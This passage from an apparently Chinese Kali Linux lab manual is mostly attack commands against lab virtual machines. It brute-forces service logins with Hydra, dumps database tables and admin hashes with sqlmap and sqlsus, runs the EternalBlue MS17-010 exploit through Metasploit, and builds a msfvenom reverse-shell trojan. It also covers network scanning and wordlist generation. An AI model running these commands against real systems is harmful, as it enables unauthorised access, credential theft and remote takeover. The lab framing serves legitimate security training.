instead of stdout</li><li>-o 文件 将找到的密码写在文件里面 以此代替输出到屏幕上</li><li>-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解</li><li>-t TASKS run TASKS number of connects in parallel (default: 16)</li><li>-t 计划任务 同时运行几个任务(默认是</li></ul></li></ol><p>: 16)</p><ul><li>-w TIME defines the max wait time in seconds for responses (default: 30)</li><li>-w 时间 定义超时时间秒数(默认是: 30)</li><li>-vV 详细显示用户名或者密码的破解过程</li></ul><ol start="3"><li><strong>用法</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 可选参数+必选参数+攻击地址+攻击类型</span><br></pre></td></tr></table></figure><ol start="4"><li><p><strong>举例：使用hydra尝试爆破FTP服务器账号密码</strong></p><ul><li>先在kali终端中尝试登录FTP服务器，看服务是否正常</li></ul></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &lt;target\_ip&gt;</span><br></pre></td></tr></table></figure><ul><li>查看本地的字典文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><ul><li>加载本地的密码文件来进行爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://&lt;target\_ip&gt;</span><br></pre></td></tr></table></figure><ul><li>使用爆破的密码进行登录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp &lt;target\_ip&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li><p><strong>其它的一些破解类型</strong></p><ul><li>使用hydra破解SSH的密码</li></ul></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</span><br></pre></td></tr></table></figure><ul><li>破解HTTPS</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -m /index.php -l username -P pass.txt IP https</span><br></pre></td></tr></table></figure><ul><li>破解Teamspeak</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 - P 密码字典 - s 端口号 - vV ip teamspeak</span><br></pre></td></tr></table></figure><ul><li>破解Cisco</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -P pass.txt IP cisco</span><br><span class="line">hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</span><br></pre></td></tr></table></figure><ul><li>破解SMB</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P pass.txt IP smb</span><br></pre></td></tr></table></figure><ul><li>破解POP3</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l muts -P pass.txt my.pop3.mail pop3</span><br></pre></td></tr></table></figure><ul><li>破解RDP</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra IP rdp -l administrator -P pass.txt -V</span><br></pre></td></tr></table></figure><ul><li>破解HTTP-Proxy</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass.txt http-proxy://10.36.16.18</span><br></pre></td></tr></table></figure><ul><li>破解Telnet</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra IP telnet -l 用户 - P 密码字典 - t 32 -s 23 -e ns -f –V</span><br></pre></td></tr></table></figure><h2 id="实验总结-9"><a href="#实验总结-9" class="headerlink" title="实验总结"></a>实验总结</h2><p>掌握使用Hydra来爆破常见的服务</p><h1 id="实验-30-黑客安防工具-Masscan"><a href="#实验-30-黑客安防工具-Masscan" class="headerlink" title="实验 30 黑客安防工具-Masscan"></a>实验 30 黑客安防工具-Masscan</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Masscan工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><ul><li>Kali 2016</li><li>Windows 7</li></ul><p><strong>实验工具</strong></p><ul><li>Masscan</li></ul><p><strong>实验目的</strong></p><p>了解掌握masscan工具的使用和语法</p><p><strong>实验步骤</strong></p><h2 id="Masscan的基本使用"><a href="#Masscan的基本使用" class="headerlink" title="Masscan的基本使用"></a>Masscan的基本使用</h2><ol><li><p>在终端输入以下命令启动Masscan：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan</span><br></pre></td></tr></table></figure></li><li><p>详细参数含义：</p><ul><li><code>-p</code> 指定端口进行扫描</li><li><code>--banners</code> 获取banner信息,支持少量的协议</li><li><code>--rate</code> 指定发包的速率</li><li><code>-c, --conf</code> 读取配置文件进行扫描</li><li><code>--echo</code> 将当前的配置重定向到一个配置文件中</li><li><code>-e, --adapter</code> 指定用来发包的网卡接口名称</li><li><code>--adapter-ip</code> 指定发包的IP地址</li><li><code>--adapter-port</code> 指定发包的源端口</li><li><code>--adapter-mac</code> 指定发包的源MAC地址</li><li><code>--router-mac</code> 指定网关的MAC地址</li><li><code>--exclude</code> IP地址范围黑名单，防止masscan扫描</li><li><code>--excludefile</code> 指定IP地址范围黑名单文件</li><li><code>--includefile, -iL</code> 读取一个范围列表进行扫描</li><li><code>--ping</code> 扫描应该包含ICMP回应请求</li><li><code>--append-output</code> 以附加的形式输出到文件</li><li><code>--iflist</code> 列出可用的网络接口，然后退出</li><li><code>--retries</code> 发送重试的次数，以1秒为间隔</li><li><code>--nmap</code> 打印与nmap兼容的相关信息</li><li><code>--http-user-agent</code> 设置user-agent字段的值</li><li><code>--show [open,close]</code> 告诉要显示的端口状态，默认是显示开放端口</li><li><code>--noshow [open,close]</code> 禁用端口状态显示</li><li><code>--pcap</code> 将接收到的数据包以libpcap格式存储</li><li><code>--regress</code> 运行回归测试，测试扫描器是否正常运行</li><li><code>--ttl</code> 指定传出数据包的TTL值，默认为255</li><li><code>--wait</code> 指定发送完包之后的等待时间，默认为10秒</li><li><code>--offline</code> 没有实际的发包，主要用来测试开销</li><li><code>-sL</code> 不执行扫描，主要是生成一个随机地址列表</li><li><code>--readscan</code> 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式</li><li><code>--connection-timeout</code> 抓取banners时指定保持TCP连接的最大秒数，默认是30秒</li></ul></li><li><p>示例命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan –p21,80,81,8080 192.168.163.0/24 --rate=10000</span><br></pre></td></tr></table></figure><p>扫描指定21, 80, 81, 8080端口的192.168.163.0网段，以每秒10000个包的速率。</p></li></ol><h2 id="扫描指定IP文件中的地址"><a href="#扫描指定IP文件中的地址" class="headerlink" title="扫描指定IP文件中的地址"></a>扫描指定IP文件中的地址</h2><p>IP地址范围有三种有效格式：</p><ol><li><p>单独的IPv4地址</p></li><li><p>类似”10.0.0.1-10.0.0.233”的范围地址</p></li><li><p>CIDR地址，类似于”0.0.0.0&#x2F;0”，多个目标可以用逗号隔开</p></li><li><p>扫描ip.txt中IP从1-1000端口并获取banner信息，发包速率为10000：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-1000 --rate=10000 --banners -iL ip.txt</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握Masscan扫描工具的使用，对比其它的扫描软件的优势所在。</p><h1 id="实验-31-注入工具-Sqlmap"><a href="#实验-31-注入工具-Sqlmap" class="headerlink" title="实验 31 注入工具-Sqlmap"></a>实验 31 注入工具-Sqlmap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p><p><strong>实验工具</strong></p><p>Sqlmap</p><p><strong>实验目的</strong></p><p>掌握sqlmap软件用法</p><p><strong>实验步骤</strong></p><h2 id="使用Sqlmap进行SQL注入攻击"><a href="#使用Sqlmap进行SQL注入攻击" class="headerlink" title="使用Sqlmap进行SQL注入攻击"></a>使用Sqlmap进行SQL注入攻击</h2><ol><li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p></li><li><p>在终端中启动sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap</span><br></pre></td></tr></table></figure></li><li><p>使用sqlmap检测URL是否存在注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.134/mysqltest/mysqltest/index.php?age=25&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>如果存在注入，使用参数<code>--tables</code>列出表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.134/mysqltest/mysqltest/index.php?age=25&quot;</span> --tables</span><br></pre></td></tr></table></figure></li><li><p>列出指定数据库中表名和列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.134/mysqltest/mysqltest/index.php?age=25&quot;</span> -D dbname -T tablename --columns</span><br></pre></td></tr></table></figure></li><li><p>跑出指定数据库中的数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.134/mysqltest/mysqltest/index.php?age=25&quot;</span> -D dbname -T tablename --dump</span><br></pre></td></tr></table></figure></li><li><p>跑出admin的哈希值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.163.134/mysqltest/mysqltest/index.php?age=25&quot;</span> -D dbname -T admin\_table --dump</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>Sqlmap是注入非常强大的工具，需要熟练掌握其使用方法。</p><h1 id="实验-32-数据库评估-Sqlsus"><a href="#实验-32-数据库评估-Sqlsus" class="headerlink" title="实验 32 数据库评估-Sqlsus"></a>实验 32 数据库评估-Sqlsus</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Sqlsus工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 Kali 2016<br>靶机 Windows 7 + mysqltest</p><p><strong>实验工具</strong></p><p>Sqlsus</p><p><strong>实验目的</strong></p><p>掌握常用的数据库评估软件用法</p><p><strong>实验步骤</strong></p><h2 id="使用Sqlsus进行数据库评估"><a href="#使用Sqlsus进行数据库评估" class="headerlink" title="使用Sqlsus进行数据库评估"></a>使用Sqlsus进行数据库评估</h2><ol><li><p>访问简易测试网页：<a href="http://192.168.163.134/mysqltest/mysqltest/index.php?age=25">http://192.168.163.134/mysqltest/mysqltest/index.php?age=25</a></p></li><li><p>在终端输入以下命令启动Sqlsus：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus</span><br></pre></td></tr></table></figure></li><li><p>生成配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus --wizard</span><br></pre></td></tr></table></figure></li><li><p>修改生成的配置文件，定位到<code>url_start</code>，输入需要检测的URL地址。</p></li><li><p>启动Sqlsus，使用<code>start</code>发起获取数据库信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus -config-file path/to/config/file.conf --url-start</span><br></pre></td></tr></table></figure></li><li><p>可以使用<code>help</code>查看更多命令。</p></li><li><p>获取表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus -config-file path/to/config/file.conf --get tables</span><br></pre></td></tr></table></figure></li><li><p>获取表中的列名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus -config-file path/to/config/file.conf --get columns</span><br></pre></td></tr></table></figure></li><li><p>获取admin表的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlsus -config-file path/to/config/file.conf --dump <span class="string">&quot;select \* from admin&quot;</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握Sqlsus软件的使用。</p><h1 id="实验-33-网络嗅探-Tcpdump"><a href="#实验-33-网络嗅探-Tcpdump" class="headerlink" title="实验 33 网络嗅探-Tcpdump"></a>实验 33 网络嗅探-Tcpdump</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Tcpdump工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016</p><p><strong>实验工具</strong></p><p>tcpdump</p><p><strong>实验目的</strong></p><p>使用tcpdump工具捕获数据包</p><h2 id="实验步骤-19"><a href="#实验步骤-19" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>直接启动tcpdump将监视第一个网络接口上所有流过的数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump</span><br></pre></td></tr></table></figure></li><li><p>指定网络接口进行抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0</span><br></pre></td></tr></table></figure></li><li><p>监听指定主机或ip地址的数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump host 192.168.1.1</span><br></pre></td></tr></table></figure></li><li><p>监听主机或ip所发送的所有数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump src host 192.168.1.1</span><br></pre></td></tr></table></figure></li><li><p>监听主机或ip所接收的所有数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump dst host 192.168.1.1</span><br></pre></td></tr></table></figure></li><li><p>监听指定主机或ip地址之间的数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump src host 192.168.1.1 and dst host 192.168.1.2</span><br></pre></td></tr></table></figure></li></ol><p>再开一个终端，ping本机的网关，我们需要通过tcpdump工具进行抓包</p><p><strong>参数详解</strong></p><ul><li><code>-a</code>：尝试将网络和广播地址转换成名称；</li><li><code>-c &lt;数据包数目&gt;</code>：收到指定的数据包数目后，就停止进行倾倒操作；</li><li><code>-d</code>：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出；</li><li><code>-dd</code>：把编译过的数据包编码转换成C语言的格式，并倾倒到标准输出；</li><li><code>-ddd</code>：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出；</li><li><code>-e</code>：在每列倾倒资料上显示连接层级的文件头；</li><li><code>-f</code>：用数字显示网际网络地址；</li><li><code>-F &lt;表达文件&gt;</code>：指定内含表达方式的文件；</li><li><code>-i &lt;网络界面&gt;</code>：使用指定的网络截面送出数据包；</li><li><code>-l</code>：使用标准输出列的缓冲区；</li><li><code>-n</code>：不把主机的网络地址转换成名字；</li><li><code>-N</code>：不列出域名；</li><li><code>-O</code>：不将数据包编码最佳化；</li><li><code>-p</code>：不让网络界面进入混杂模式；</li><li><code>-q</code>：快速输出，仅列出少数的传输协议信息；</li><li><code>-r &lt;数据包文件&gt;</code>：从指定的文件读取数据包数据；</li><li><code>-s &lt;数据包大小&gt;</code>：设置每个数据包的大小；</li><li><code>-S</code>：用绝对而非相对数值列出TCP关联数；</li><li><code>-t</code>：在每列倾倒资料上不显示时间戳记；</li><li><code>-tt</code>：在每列倾倒资料上显示未经格式化的时间戳记；</li><li><code>-T &lt;数据包类型&gt;</code>：强制将表达方式所指定的数据包转译成设置的数据包类型；</li><li><code>-v</code>：详细显示指令执行过程；</li><li><code>-vv</code>：更详细显示指令执行过程；</li><li><code>-x</code>：用十六进制字码列出数据包资料；</li><li><code>-w &lt;数据包文件&gt;</code>：把数据包数据写入指定的文件。</li></ul><p><strong>实验总结</strong></p><p>使用Tcpdump抓取特定的协议报文</p><h1 id="实验34-MS17-010漏洞复现"><a href="#实验34-MS17-010漏洞复现" class="headerlink" title="实验34 MS17_010漏洞复现"></a>实验34 MS17_010漏洞复现</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器复现MS17_010漏洞，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机 kali 2018 ip地址：192.168.163.152<br>靶机 windows 7 ip地址：192.168.163.134</p><p><strong>实验工具</strong></p><p>无</p><p><strong>实验目的</strong></p><p>metasploit利用ms17_010去攻击靶机</p><h2 id="实验步骤-20"><a href="#实验步骤-20" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali终端中输入msfconsole启动metasploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>启动后搜索漏洞相关的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17\_010</span><br></pre></td></tr></table></figure></li><li><p>先利用扫描模块对win 7 靶机进行扫描，检测看是否存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb\_ms17\_010</span><br></pre></td></tr></table></figure></li><li><p>使用该模块后设置目标IP或者IP段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.163.134</span><br></pre></td></tr></table></figure></li><li><p>执行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>使用ms17_010漏洞模块对靶机进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17\_010\_eternalblue</span><br></pre></td></tr></table></figure></li><li><p>查看可设置的选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>设置靶机目标ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.163.134</span><br></pre></td></tr></table></figure></li><li><p>执行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>因为MS17_010是近几年新爆出的漏洞，所以还有很多用户没有升级打补丁，在内网可以进行检测看还有没有主机存在漏洞</p><h1 id="实验35-Web应用指纹识别器-Whatweb"><a href="#实验35-Web应用指纹识别器-Whatweb" class="headerlink" title="实验35 Web应用指纹识别器-Whatweb"></a>实验35 Web应用指纹识别器-Whatweb</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某</p><p>天他收到上级领导命令，需要在kali服务器使用Whatweb工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016 192.168.21.128</p><p><strong>实验工具</strong></p><p>whatweb</p><p><strong>实验目的</strong></p><p>掌握whatweb的使用</p><h2 id="实验步骤-21"><a href="#实验步骤-21" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在终端直接启动whatweb软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb</span><br></pre></td></tr></table></figure></li><li><p>查看whatweb版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb --version</span><br></pre></td></tr></table></figure></li><li><p>查看有哪些可用的插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb --l</span><br></pre></td></tr></table></figure></li><li><p>使用whatweb识别网站的指纹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb --target http://www.baidu.com</span><br></pre></td></tr></table></figure></li><li><p>对当个目标进行简单的探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://127.0.0.1</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握使用Whatweb对web服务器进行嗅探测试</p><h1 id="实验-36-端口扫描之-Nmap"><a href="#实验-36-端口扫描之-Nmap" class="headerlink" title="实验 36 端口扫描之-Nmap"></a>实验 36 端口扫描之-Nmap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Nmap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9<br>靶机ip地址：192.168.163.136</p><p><strong>实验工具</strong></p><p>Nmap</p><p><strong>实验目的</strong></p><p>掌握nmap端口扫描</p><h2 id="实验步骤-22"><a href="#实验步骤-22" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>查看kali自带nmap的版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -V</span><br></pre></td></tr></table></figure></li><li><p>nmap的ping扫描本网段存活的主机(ip地址后面加掩码即扫描本网段)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.163.0/24</span><br></pre></td></tr></table></figure></li><li><p>nmap的SYN半开放扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.163.136/24</span><br></pre></td></tr></table></figure></li><li><p>nmap的TCP扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 192.168.163.136</span><br></pre></td></tr></table></figure></li><li><p>nmap扫描靶机所有开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.163.136</span><br></pre></td></tr></table></figure></li><li><p>nmap扫描靶机特定端口 22 和 80 和 8080</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,80,8080 192.168.163.136</span><br></pre></td></tr></table></figure></li><li><p>nmap识别系统信息扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.163.136</span><br></pre></td></tr></table></figure></li><li><p>nmap的批量扫描 - iL 从ip文本中导入扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -iL ip.txt</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>区分NMAP不同参数的使用，牢记常用的参数</p><h1 id="实验-37-服务枚举-Amap"><a href="#实验-37-服务枚举-Amap" class="headerlink" title="实验 37 服务枚举-Amap"></a>实验 37 服务枚举-Amap</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Amap工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali<br>靶机：centos 6.9 ip地址：192.168.163.132</p><p><strong>实验工具</strong></p><p>zmap</p><p><strong>实验目的</strong></p><p>掌握amzp的使用</p><h2 id="实验步骤-23"><a href="#实验步骤-23" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>启动amap查看帮助信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amap -b -q 192.168.163.132 22</span><br></pre></td></tr></table></figure></li><li><p>还能设置端口的范围段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">amap -b -q 192.168.163.132 1-100</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>思考Amzp是获取服务器的banner来获取服务器的信息，能想到有什么劣势吗。</p><h1 id="实验38-Metasploit-msfvenom生成payload实验"><a href="#实验38-Metasploit-msfvenom生成payload实验" class="headerlink" title="实验38 Metasploit-msfvenom生成payload实验"></a>实验38 Metasploit-msfvenom生成payload实验</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali上生成一个木马文件，当centos服务器上执行这个文件时，会反弹shell到kali上，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>kali 2016<br>centos 6.9</p><p><strong>实验工具</strong></p><p>Metasploit<br>ftp</p><p><strong>实验目的</strong></p><p>使用metasploit生成木马文件，在centos执行文件时拿到shell</p><h2 id="实验步骤-24"><a href="#实验步骤-24" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li><p>在kali虚拟机上测试与靶机的连通性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.137 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在靶机centos上测试与kali的连通性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.127.138 -c 4</span><br></pre></td></tr></table></figure></li><li><p>在kali上使用shell马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.127.138 LPORT=4444 -f elf &gt; shell</span><br></pre></td></tr></table></figure></li><li><p>启动msfconsole</p></li><li><p>在kali中启动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Run</span><br></pre></td></tr></table></figure></li><li><p>通过ftp把生成的文件传到靶机上，在靶机上先给文件权限再运行文件</p></li><li><p>输入shell查看权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shell</span><br></pre></td></tr></table></figure></li></ol><p><strong>实验总结</strong></p><p>掌握使用kali下的metasploit生成木马文件，在centos执行文件时拿到shell</p><h1 id="实验-39-通用密码生成器-Crunch"><a href="#实验-39-通用密码生成器-Crunch" class="headerlink" title="实验 39 通用密码生成器-Crunch"></a>实验 39 通用密码生成器-Crunch</h1><p><strong>实验场景</strong></p><p>小明是网络工程师，某天他收到上级领导命令，需要在kali服务器使用Crunch工具，为避免在部署时候出现什么问题，小明首先在自己的虚拟机上搭建一遍环境。</p><p><strong>实验环境</strong></p><p>攻击机：kali 2016</p><p><strong>实验工具</strong></p><p>crunch</p><p><strong>实验目的</strong></p><p>掌握kali下crunch工具的使用</p><h2 id="实验步骤-25"><a href="#实验步骤-25" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>Crunch是一款密码生成工具，能按照要求生成一个密码文件，用于暴力破解。</p><ol><li><p>在终端直接输入 <code>crunch --h</code> 查看 Crunch 帮助信息。</p></li><li><p>生成的密码格式为：<code>crunch &lt;min&gt; &lt;max&gt; [options]</code>。这里我们使用不添加任何参数来生成密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 4</span><br></pre></td></tr></table></figure><p>这会生成最少位数为 1 位，最大为 4 位的密码，由 26 